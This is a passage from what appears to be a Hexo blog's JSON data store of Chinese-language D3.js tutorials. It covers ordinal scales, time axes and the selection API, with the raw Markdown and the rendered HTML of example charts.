x])</code>：指定输入域范围（一系列离散的数据）</li>\n<li><code>ordinal.range([k1, k2, ..., kn])</code>：如果指定了输出范围，设置当前比例尺对象的输出范围为指定的 values 数组，如果 values 中的值的个数少于输入域中元素的个数，那么 values 中的值会被循环使用。（主要用于颜色）</li>\n<li><code>ordinal.rangePoints([min, max], padding)</code>：指定输出范围为一个连续的区间，第一个位置和最后一个位置会因为入参 padding 的值而做相应，消减长度是padding 个间隔长度的一半；默认情况下 padding 是 0 </li>\n<li><code>ordinal.rangeBands([min, max], padding, outerPadding)</code>：该函数是将区间切分成一个个小的区间段，而不是一个个刻度点（刻度在坐标轴中间，而不是在起点，适用于柱状图）</li>\n<li><code>rdinal.rangeRoundPoints([min, max], padding)</code>：功能同 <code>ordinal.rangePoints</code>，但是该函数可以美化输出的刻度点，即保证整数</li>\n<li><code>ordinal.rangeRoundBands([min, max], padding, outerPadding)</code> 功能同 <code>ordinal.rangeBands</code>，但是该函数可以美化输出的区间段，即保证每个区间段的起点值都是整数</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">800</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">40</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dateRange = [<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(<span class=\"number\">2017</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>), <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(<span class=\"number\">2018</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>)];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xScale = d3.time.scale()</span></span><br><span class=\"line\">            .domain(dateRange)</span><br><span class=\"line\">            .rangeRound([padding, w - padding]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> axis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(xScale)</span><br><span class=\"line\"><span class=\"javascript\">            .tickFormat(d3.time.format(<span class=\"string\">&#x27;%m-%d&#x27;</span>));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;x-axis&#x27;</span>)</span></span><br><span class=\"line\">            .call(axis);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"选择集","date":"2021-03-23T16:00:00.000Z","_content":"\n# 选择集\n\n### 选择器\n`d3.select()` 与 `jQuery` 的选择器类似，支持各种 CSS3 选择器，并能通过各种条件筛选（实际上使用的是浏览器提供的查询方法 `document.querySelector()`）\n\n### 元素选择 \n说明：`d3.select()`、`d3.selectAll()` 返回值是一组选择，该选择是一组元素。D3 绑定额外的方法到该数组上（在该对象与数组间添加了一层原型链 `d3.selection.prototype`），可以在选中的元素上应用操作，例如为所有选中的元素设置属性值。\n\n> `d3.select()` 、`d3.selectAll()` 返回一个选集 selection，它是 D3 操作 DOM 的入口\n> `selection.data()` 操作的结果是 update 选择，这表示选择的 DOM 元素已成功绑定到指定的数据元素。update 选择还包含对 enter 和 exit 的选择。\n\n#### 选择集（`selection`）\n\n* selection.select(selector): 选中第一个目标元素\n* selection.selectAll(selector): 选中所有符合的目标元素\n* selection.append(name)\n* selection.insert(name, before)\n* selection.remove()\n* selection.empty()\n* selection.filter(filter)\n* selection.attr(name, value)：获取、设置元素的属性\n* selection.style(name, value, priority)：获取、设置元素的 CSS 样式\n* selection.classed(name, value)：获取、设置元素的 `class` 属性，可以对象的方式一次传入多个属性，\n* selection.property(name, value)：获取、设置元素的 `prop` 特性，如是否被选中、value 等信息\n* selection.html(value)：用来获取或设置选定元素的 HTML\n* selection.text(value)：用来获取或设置选定元素的文本内容\n* selection.size()\n* selection.node()(type, listener, capture)\n\n> **说明**\n> * 当没有任何元素符合条件时，方法返回的是一个空的选择结果（selection）\n> * 这些函数可用于单个元素以及多个元素，当应用于多元素选集时，这些函数会依次作用于其中每个元素\n> * `attr()`、`text()` 等方法中中赋值时可使用函数，如 `function (data, i) { console.log(this); }` ，其中 `data` 指每一项数据，`i` 指索引，`this` 指当前 DOM 元素\n> * selection 选择集的 `select`、`append`、`insert`函数会返回一个新的选集，建议用缩进来区别应用于不同选集上的级联函数，如下所示：\n\n```javascript\nd3.select('.rect-test')\n    .attr('fill', 'red')\n.selectAll('text')\n    .attr('x', 100)\n    .attr('y', 100);\n```\n\n* selection.data(value, key) 连接指定的一组数据的和当前选择，**key** 函数可以被指定为控制数据是如何连接元素\n    * 没有 key 函数时，默认使用 index 连接元素，即用 index 判断 `enter`、`update` 和  `exit` 选择集\n    * 有 key 函数时，用 key 函数的返回值连接元素，有利于复用 DOM 元素（与 Vue 中的 `v-key` 相似）\n* selection.datum(value) 获取或设置每个选定的元素绑定的数据，不计算一个连接（因此不计算 enter 和 exit 的选择）\n* selection.each(callback) 遍历集合中的每个元素\n* selection.sort(comparator) 根据指定的 comparator 函数对当前选择的元素排序\n* selection.order() 重新插入元素到文档，使文档顺序选与择顺序就相匹配\n* selection.call(callback) 调用指定函数，并返回当前选择（方便链式调用）\n    * `svg.append('g').call(axis)` 与 `axis(svg.append('g'))` 作用一样;\n* selection.interrupt(name) 立即中断当前的过渡\n* selection.transition(name) 为当前选择添加过渡效果\n\n说明：\n* 所有绑定了数据的父元素，其子元素均具有从父元素那里继承下来的值。\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>D3.js - 散点图</title>\n    <style>\n        .axis path,\n        .axis line {\n            fill: none;\n            stroke: black;\n            shape-rendering: crispEdges;\n        }\n\n        .axis text {\n            font-family: sans-serif;\n            font-size: 12px;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 400;\n        let h = 300;\n        let padding = 30;\n        let dataSet = [[5, 20], [480, 90], [250, 50], [100, 33], [330, 95], [410, 12], [475, 44], [25, 67], [85, 21], [220, 88]];\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let xScale = d3.scale.linear()\n            .domain([0, d3.max(dataSet, data => data[0])])\n            .range([padding, w - padding * 2]);\n\n        let yScale = d3.scale.linear()\n            .domain([0, d3.max(dataSet, data => data[1])])\n            .range([h - padding, padding]);\n\n        let rScale = d3.scale.linear()\n            .domain([0, d3.max(dataSet, data => data[1])])\n            .range([4, 10]);\n\n        let circles = svg.selectAll('circle')\n            .data(dataSet)\n            .enter()\n            .append('circle');\n\n        let xAxis = d3.svg.axis()\n            .scale(xScale)\n            .ticks(6)\n            .orient('bottom');\n\n        let yAxis = d3.svg.axis()\n            .scale(yScale)\n            .ticks(5)\n            .orient('left');\n\n        svg.append('g')\n            .attr('class', 'axis')\n            .attr('transform', `translate(0, ${h - padding})`)\n            .call(xAxis);\n\n        svg.append('g')\n            .attr('class', 'axis')\n            .attr('transform', `translate(${padding}, 0)`)\n            .call(yAxis);\n\n        circles.attr('cx', data => xScale(data[0]))\n            .attr('cy', data => yScale(data[1]))\n            .attr('r', data => rScale(data[1]));\n    </script>\n</body>\n</html>\n```","source":"_posts/D3.js/选择集.md","raw":"---\ntitle: 选择集\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 选择集\n\n### 选择器\n`d3.select()` 与 `jQuery` 的选择器类似，支持各种 CSS3 选择器，并能通过各种条件筛选（实际上使用的是浏览器提供的查询方法 `document.querySelector()`）\n\n### 元素选择 \n说明：`d3.select()`、`d3.selectAll()` 返回值是一组选择，该选择是一组元素。D3 绑定额外的方法到该数组上（在该对象与数组间添加了一层原型链 `d3.selection.prototype`），可以在选中的元素上应用操作，例如为所有选中的元素设置属性值。\n\n> `d3.select()` 、`d3.selectAll()` 返回一个选集 selection，它是 D3 操作 DOM 的入口\n> `selection.data()` 操作的结果是 update 选择，这表示选择的 DOM 元素已成功绑定到指定的数据元素。update 选择还包含对 enter 和 exit 的选择。\n\n#### 选择集（`selection`）\n\n* selection.select(selector): 选中第一个目标元素\n* selection.selectAll(selector): 选中所有符合的目标元素\n* selection.append(name)\n* selection.insert(name, before)\n* selection.remove()\n* selection.empty()\n* selection.filter(filter)\n* selection.attr(name, value)：获取、设置元素的属性\n* selection.style(name, value, priority)：获取、设置元素的 CSS 样式\n* selection.classed(name, value)：获取、设置元素的 `class` 属性，可以对象的方式一次传入多个属性，\n* selection.property(name, value)：获取、设置元素的 `prop` 特性，如是否被选中、value 等信息\n* selection.html(value)：用来获取或设置选定元素的 HTML\n* selection.text(value)：用来获取或设置选定元素的文本内容\n* selection.size()\n* selection.node()(type, listener, capture)\n\n> **说明**\n> * 当没有任何元素符合条件时，方法返回的是一个空的选择结果（selection）\n> * 这些函数可用于单个元素以及多个元素，当应用于多元素选集时，这些函数会依次作用于其中每个元素\n> * `attr()`、`text()` 等方法中中赋值时可使用函数，如 `function (data, i) { console.log(this); }` ，其中 `data` 指每一项数据，`i` 指索引，`this` 指当前 DOM 元素\n> * selection 选择集的 `select`、`append`、`insert`函数会返回一个新的选集，建议用缩进来区别应用于不同选集上的级联函数，如下所示：\n\n```javascript\nd3.select('.rect-test')\n    .attr('fill', 'red')\n.selectAll('text')\n    .attr('x', 100)\n    .attr('y', 100);\n```\n\n* selection.data(value, key) 连接指定的一组数据的和当前选择，**key** 函数可以被指定为控制数据是如何连接元素\n    * 没有 key 函数时，默认使用 index 连接元素，即用 index 判断 `enter`、`update` 和  `exit` 选择集\n    * 有 key 函数时，用 key 函数的返回值连接元素，有利于复用 DOM 元素（与 Vue 中的 `v-key` 相似）\n* selection.datum(value) 获取或设置每个选定的元素绑定的数据，不计算一个连接（因此不计算 enter 和 exit 的选择）\n* selection.each(callback) 遍历集合中的每个元素\n* selection.sort(comparator) 根据指定的 comparator 函数对当前选择的元素排序\n* selection.order() 重新插入元素到文档，使文档顺序选与择顺序就相匹配\n* selection.call(callback) 调用指定函数，并返回当前选择（方便链式调用）\n    * `svg.append('g').call(axis)` 与 `axis(svg.append('g'))` 作用一样;\n* selection.interrupt(name) 立即中断当前的过渡\n* selection.transition(name) 为当前选择添加过渡效果\n\n说明：\n* 所有绑定了数据的父元素，其子元素均具有从父元素那里继承下来的值。\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>D3.js - 散点图</title>\n    <style>\n        .axis path,\n        .axis line {\n            fill: none;\n            stroke: black;\n            shape-rendering: crispEdges;\n        }\n\n        .axis text {\n            font-family: sans-serif;\n            font-size: 12px;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 400;\n        let h = 300;\n        let padding = 30;\n        let dataSet = [[5, 20], [480, 90], [250, 50], [100, 33], [330, 95], [410, 12], [475, 44], [25, 67], [85, 21], [220, 88]];\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let xScale = d3.scale.linear()\n            .domain([0, d3.max(dataSet, data => data[0])])\n            .range([padding, w - padding * 2]);\n\n        let yScale = d3.scale.linear()\n            .domain([0, d3.max(dataSet, data => data[1])])\n            .range([h - padding, padding]);\n\n        let rScale = d3.scale.linear()\n            .domain([0, d3.max(dataSet, data => data[1])])\n            .range([4, 10]);\n\n        let circles = svg.selectAll('circle')\n            .data(dataSet)\n            .enter()\n            .append('circle');\n\n        let xAxis = d3.svg.axis()\n            .scale(xScale)\n            .ticks(6)\n            .orient('bottom');\n\n        let yAxis = d3.svg.axis()\n            .scale(yScale)\n            .ticks(5)\n            .orient('left');\n\n        svg.append('g')\n            .attr('class', 'axis')\n            .attr('transform', `translate(0, ${h - padding})`)\n            .call(xAxis);\n\n        svg.append('g')\n            .attr('class', 'axis')\n            .attr('transform', `translate(${padding}, 0)`)\n            .call(yAxis);\n\n        circles.attr('cx', data => xScale(data[0]))\n            .attr('cy', data => yScale(data[1]))\n            .attr('r', data => rScale(data[1]));\n    </script>\n</body>\n</html>\n```","slug":"D3.js/选择集","published":1,"updated":"2021-04-28T02:31:21.315Z","_id":"cko0u126y0008y26r0x8pf7xw","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"选择集\"><a href=\"#选择集\" class=\"headerlink\" title=\"选择集\"></a>选择集</h1><h3 id=\"选择器\"><a href=\"#选择器\" class=\"headerlink\" title=\"选择器\"></a>选择器</h3><p><code>d3.select()</code> 与 <code>jQuery</code> 的选择器类似，支持各种 CSS3 选择器，并能通过各种条件筛选（实际上使用的是浏览器提供的查询方法 <code>document.querySelector()</code>）</p>\n<h3 id=\"元素选择\"><a href=\"#元素选择\" class=\"headerlink\" title=\"元素选择\"></a>元素选择</h3><p>说明：<code>d3.select()</code>、<code>d3.selectAll()</code> 返回值是一组选择，该选择是一组元素。D3 绑定额外的方法到该数组上（在该对象与数组间添加了一层原型链 <code>d3.selection.prototype</code>），可以在选中的元素上应用操作，例如为所有选中的元素设置属性值。</p>\n<blockquote>\n<p><code>d3.select()</code> 、<code>d3.selectAll()</code> 返回一个选集 selection，它是 D3 操作 DOM 的入口<br><code>selection.data()</code> 操作的结果是 update 选择，这表示选择的 DOM 元素已成功绑定到指定的数据元素。update 选择还包含对 enter 和 exit 的选择。</p>\n</blockquote>\n<h4 id=\"选择集（selection）\"><a href=\"#选择集（selection）\" class=\"headerlink\" title=\"选择集（selection）\"></a>选择集（<code>selection</code>）</h4><ul>\n<li>selection.select(selector): 选中第一个目标元素</li>\n<li>selection.selectAll(selector): 选中所有符合的目标元素</li>\n<li>selection.append(name)</li>\n<li>selection.insert(name, before)</li>\n<li>selection.remove()</li>\n<li>selection.empty()</li>\n<li>selection.filter(filter)</li>\n<li>selection.attr(name, value)：获取、设置元素的属性</li>\n<li>selection.style(name, value, priority)：获取、设置元素的 CSS 样式</li>\n<li>selection.classed(name, value)：获取、设置元素的 <code>class</code> 属性，可以对象的方式一次传入多个属性，</li>\n<li>selection.property(name, value)：获取、设置元素的 <code>prop</code> 特性，如是否被选中、value 等信息</li>\n<li>selection.html(value)：用来获取或设置选定元素的 HTML</li>\n<li>selection.text(value)：用来获取或设置选定元素的文本内容</li>\n<li>selection.size()</li>\n<li>selection.node()(type, listener, capture)</li>\n</ul>\n<blockquote>\n<p><strong>说明</strong></p>\n<ul>\n<li>当没有任何元素符合条件时，方法返回的是一个空的选择结果（selection）</li>\n<li>这些函数可用于单个元素以及多个元素，当应用于多元素选集时，这些函数会依次作用于其中每个元素</li>\n<li><code>attr()</code>、<code>text()</code> 等方法中中赋值时可使用函数，如 <code>function (data, i) &#123; console.log(this); &#125;</code> ，其中 <code>data</code> 指每一项数据，<code>i</code> 指索引，<code>this</code> 指当前 DOM 元素</li>\n<li>selection 选择集的 <code>select</code>、<code>append</code>、<code>insert</code>函数会返回一个新的选集，建议用缩进来区别应用于不同选集上的级联函数，如下所示：</li>\n</ul>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d3.select(<span class=\"string\">&#x27;.rect-test&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;text&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">100</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>selection.data(value, key) 连接指定的一组数据的和当前选择，<strong>key</strong> 函数可以被指定为控制数据是如何连接元素<ul>\n<li>没有 key 函数时，默认使用 index 连接元素，即用 index 判断 <code>enter</code>、<code>update</code> 和  <code>exit</code> 选择集</li>\n<li>有 key 函数时，用 key 函数的返回值连接元素，有利于复用 DOM 元素（与 Vue 中的 <code>v-key</code> 相似）</li>\n</ul>\n</li>\n<li>selection.datum(value) 获取或设置每个选定的元素绑定的数据，不计算一个连接（因此不计算 enter 和 exit 的选择）</li>\n<li>selection.each(callback) 遍历集合中的每个元素</li>\n<li>selection.sort(comparator) 根据指定的 comparator 函数对当前选择的元素排序</li>\n<li>selection.order() 重新插入元素到文档，使文档顺序选与择顺序就相匹配</li>\n<li>selection.call(callback) 调用指定函数，并返回当前选择（方便链式调用）<ul>\n<li><code>svg.append(&#39;g&#39;).call(axis)</code> 与 <code>axis(svg.append(&#39;g&#39;))</code> 作用一样;</li>\n</ul>\n</li>\n<li>selection.interrupt(name) 立即中断当前的过渡</li>\n<li>selection.transition(name) 为当前选择添加过渡效果</li>\n</ul>\n<p>说明：</p>\n<ul>\n<li>所有绑定了数据的父元素，其子元素均具有从父元素那里继承下来的值。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>D3.js - 散点图<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .axis path,</span><br><span class=\"line\">        .axis line &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: none;</span></span><br><span class=\"line\"><span class=\"css\">            stroke: black;</span></span><br><span class=\"line\"><span class=\"css\">            shape-rendering: crispEdges;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .axis text &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-family</span>: sans-serif;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">12px</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">300</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">30</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dataSet = [[<span class=\"number\">5</span>, <span class=\"number\">20</span>], [<span class=\"number\">480</span>, <span class=\"number\">90</span>], [<span class=\"number\">250</span>, <span class=\"number\">50</span>], [<span class=\"number\">100</span>, <span class=\"number\">33</span>], [<span class=\"number\">330</span>, <span class=\"number\">95</span>], [<span class=\"number\">410</span>, <span class=\"number\">12</span>], [<span class=\"number\">475</span>, <span class=\"number\">44</span>], [<span class=\"number\">25</span>, <span class=\"number\">67</span>], [<span class=\"number\">85</span>, <span class=\"number\">21</span>], [<span class=\"number\">220</span>, <span class=\"number\">88</span>]];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">            .domain([<span class=\"number\">0</span>, d3.max(dataSet, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data[<span class=\"number\">0</span>])])</span></span><br><span class=\"line\">            .range([padding, w - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">            .domain([<span class=\"number\">0</span>, d3.max(dataSet, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data[<span class=\"number\">1</span>])])</span></span><br><span class=\"line\">            .range([h - padding, padding]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> rScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">            .domain([<span class=\"number\">0</span>, d3.max(dataSet, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data[<span class=\"number\">1</span>])])</span></span><br><span class=\"line\">            .range([4, 10]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> circles = svg.selectAll(<span 